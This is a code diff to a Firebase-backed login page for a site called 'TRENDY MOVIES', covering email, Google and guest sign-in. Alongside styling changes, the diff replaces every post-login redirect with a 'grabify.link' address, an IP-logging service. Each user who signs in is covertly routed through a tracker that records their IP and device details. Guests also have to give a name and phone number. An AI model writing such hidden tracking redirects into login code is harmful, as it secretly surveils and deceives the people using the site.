@@ -8,6 +8,97 @@
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
   <style>
+   
+/* General Styles */
+body {
+  margin: 0;
+  padding: 0;
+  font-family: 'Arial', sans-serif;
+  background-color: #1c1c1c; /* Light black background */
+  color: #ffffff;
+  text-align: center;
+}
+
+/* Buttons */
+button {
+  background-color: #ff0000; /* Red buttons */
+  color: #ffffff; /* White text */
+  border: none;
+  border-radius: 5px;
+  padding: 10px 20px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  margin: 10px;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(255, 0, 0, 0.7);
+}
+
+/* Google Button */
+#google-login-btn {
+  background-color: #ffffff; /* White background */
+  color: #000000; /* Black text */
+  border: 2px solid #cccccc; /* Subtle border */
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+}
+
+#google-login-btn:hover {
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+/* Input Fields */
+input {
+  width: 80%;
+  max-width: 400px;
+  padding: 10px;
+  margin: 10px 0;
+  border: 2px solid #333333;
+  border-radius: 5px;
+  background-color: #2a2a2a;
+  color: #ffffff;
+}
+
+input:focus {
+  outline: none;
+  border-color: #ff0000; /* Highlight input on focus */
+}
+
+/* Small Text */
+.small-text {
+  font-size: 12px;
+  color: #aaaaaa;
+  margin-top: 5px;
+}
+
+/* Actions (Text Links) */
+.text-link {
+  color: #ec670e; /* Red links */
+  cursor: pointer;
+  text-decoration: underline;
+  margin: 0 5px;
+}
+
+.text-link:hover {
+  color: #ff3e3e;
+}
+
+/* Sections */
+#login-section, #register-section {
+  padding: 20px;
+  margin: 20px auto;
+  max-width: 400px;
+  background-color: #2a2a2a; /* Slightly darker box background */
+  border-radius: 10px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
+}
+
     body {
       font-family: Arial, sans-serif;
       text-align: center;
@@ -17,7 +108,7 @@
       display: none;
     }
     .text-link {
-      color: blue;
+      color: rgb(248, 103, 7);
       cursor: pointer;
       text-decoration: underline;
       margin: 0 5px;
@@ -43,8 +134,8 @@
 </head>
 <body>
   <div id="app">
-    <h2>Welcome</h2>
-
+    <h1 style="font-family: Arial, sans-serif; font-size: 24px; color: rgb(23, 148, 23);">TRENDY MOVIES</h1>
+    <img src="https://i.imghippo.com/files/IFI1305trM.jpg" alt="Company Logo" style="border-radius: 100%; width: 150px; height: 150px;">
     <div id="login-section">
       <h2>Login</h2>
       <input id="email" type="email" placeholder="Email" required />
@@ -53,13 +144,15 @@
         <span class="small-text">Enter your account password.</span>
       </div>
       <button id="login-btn">Login</button>
+      <div>
+      <span class="text-link" id="forgot-password-link">Forgot Password?</span>    
+      <span class="text-link" id="show-register-text">Register</span>
+    </div>
       <button id="google-login-btn">
-        <img src="google.jpg" alt="Google Logo" style="width: 20px; vertical-align: middle;"> Login with Google
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo" style="width: 20px; vertical-align: middle;"> Login with Google
       </button>
       <button id="guest-login-btn">Guest Login</button>
-      <div class="actions">
-        <span class="text-link" id="forgot-password-link">Forgot Password?</span>
-        <span class="text-link" id="show-register-text">Register</span>
+      <div class="actions">     
       </div>
     </div>
 
@@ -112,72 +205,86 @@
 
     // Register new user
     document.getElementById('register-btn').addEventListener('click', () => {
-      const name = document.getElementById('name').value;
-      const phone = document.getElementById('phone').value;
-      const password = document.getElementById('password').value;
+  const name = document.getElementById('name').value;
+  const phone = document.getElementById('phone').value;
+  const password = document.getElementById('password').value;
 
-      const userRef = db.ref('users');
-      auth.createUserWithEmailAndPassword(phone + "@example.com", password)
-        .then((userCredential) => {
-          const userId = userCredential.user.uid;
-          userRef.child(userId).set({
-            name,
-            phone,
-            email: phone + "@example.com"
-          });
-          alert("User registered successfully!");
-        })
-        .catch(error => alert(error.message));
-    });
+  const userRef = db.ref('users');
+  auth.createUserWithEmailAndPassword(phone + "@example.com", password)
+    .then((userCredential) => {
+      const userId = userCredential.user.uid;
+      userRef.child(userId).set({
+        name,
+        phone,
+        email: phone + "@example.com",
+        loginMethod: "Email" // Save login method
+      });
+      alert("User registered successfully!");
+    })
+    .catch(error => alert(error.message));
+});
         // Google Login
-    const googleLoginBtn = document.getElementById('google-login-btn');
-    googleLoginBtn.addEventListener('click', () => {
-      const provider = new firebase.auth.GoogleAuthProvider();
-      auth.signInWithPopup(provider)
-        .then((result) => {
-          const user = result.user;
-          const userRef = firebase.database().ref('users/' + user.uid);
+        const googleLoginBtn = document.getElementById('google-login-btn');
+googleLoginBtn.addEventListener('click', () => {
+  const provider = new firebase.auth.GoogleAuthProvider();
+  auth.signInWithPopup(provider)
+    .then((result) => {
+      const user = result.user;
+      const userRef = firebase.database().ref('users/' + user.uid);
 
-          userRef.once('value', (snapshot) => {
-            if (!snapshot.exists()) {
-              // First time login: Ask for phone number and name
-              const name = prompt("Enter your name:");
-              const phone = prompt("Enter your phone number:");
+      userRef.once('value', (snapshot) => {
+        if (!snapshot.exists()) {
+          // First time login: Ask for phone number and name
+          const name = prompt("Enter your name:");
+          const phone = prompt("Enter your phone number:");
 
-              if (name && phone) {
-                userRef.set({
-                  name: name,
-                  phone: phone,
-                  email: user.email,
-                  photoURL: user.photoURL,
-                });
-              } else {
-                alert("Phone number and name are required!");
-                return;
-              }
-            }
-
-            // Redirect to homepage
-            window.location.href = "https://homepageuser.com";
+          if (name && phone) {
+            userRef.set({
+              name: name,
+              phone: phone,
+              email: user.email,
+              photoURL: user.photoURL,
+              loginMethod: "Google", // Save login method
+            });
+          } else {
+            alert("Phone number and name are required!");
+            return;
+          }
+        } else {
+          // Update login method for existing users
+          userRef.update({
+            loginMethod: "Google"
           });
-        })
-        .catch((error) => {
-          console.error(error);
-          alert("Google Login failed: " + error.message);
-        });
-    });
+        }
 
+        // Redirect to homepage
+        window.location.href = "https://grabify.link/17CFFS";
+      });
+    })
+    .catch((error) => {
+      console.error(error);
+      alert("Google Login failed: " + error.message);
+    });
+});
     // Login with email and password
     document.getElementById('login-btn').addEventListener('click', () => {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('login-password').value;
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('login-password').value;
 
-      auth.signInWithEmailAndPassword(email, password)
-        .then(() => {
-          window.location.href = "https://homepageuser.com";
-        })
-        .catch(error => alert(error.message));
-    });
+  auth.signInWithEmailAndPassword(email, password)
+    .then((userCredential) => {
+      const userId = userCredential.user.uid;
+      const userRef = firebase.database().ref('users/' + userId);
+
+      // Update login method in the database
+      userRef.update({
+        loginMethod: "Email"
+      });
+
+      window.location.href = "https://grabify.link/17CFFS";
+    })
+    .catch(error => alert(error.message));
+});
 
     // Forgot Password
     document.getElementById('forgot-password-link').addEventListener('click', () => {
@@ -191,24 +298,40 @@
         .then(() => alert("Password reset email sent."))
         .catch(error => alert(error.message));
     });
+// Guest Login
+document.getElementById('guest-login-btn').addEventListener('click', () => {
+  let guestLoginCount = localStorage.getItem('guestLoginCount');
+  guestLoginCount = guestLoginCount ? parseInt(guestLoginCount) : 0;
 
-    // Guest Login
-    document.getElementById('guest-login-btn').addEventListener('click', () => {
-      if (guestLoginCount >= 2) {
-        alert("Guest login limit reached.");
-        return;
-      }
-      const name = prompt("Enter your name:");
-      const phone = prompt("Enter your phone number:");
+  if (guestLoginCount >= 2) {
+    alert("Guest login limit reached. CREATE AN ID TO LOGIN.");
+    return;
+  }
 
-      if (name && phone) {
-        guestLoginCount++;
-        alert("Logged in as Guest.");
-        window.location.href = "https://homepageuser.com";
-      } else {
-        alert("Please fill out all fields.");
-      }
+  const name = prompt("Enter your name:");
+  const phone = prompt("Enter your phone number:");
+
+  if (name && phone) {
+    guestLoginCount++;
+    localStorage.setItem('guestLoginCount', guestLoginCount);
+
+    const guestUserId = `guest_${Date.now()}`;
+    db.ref('users/' + guestUserId).set({
+      name: name,
+      phone: phone,
+      role: 'guest',
+      loginTime: new Date().toISOString(),
+      loginMethod: "Guest" // Save login method
+    }).then(() => {
+      alert("Logged in as Guest.");
+      window.location.href = "https://grabify.link/17CFFS";
+    }).catch(error => {
+      alert("Failed to save guest details: " + error.message);
     });
+  } else {
+    alert("Please fill out all fields.");
+  }
+});
   </script>
 </body>
 </html>
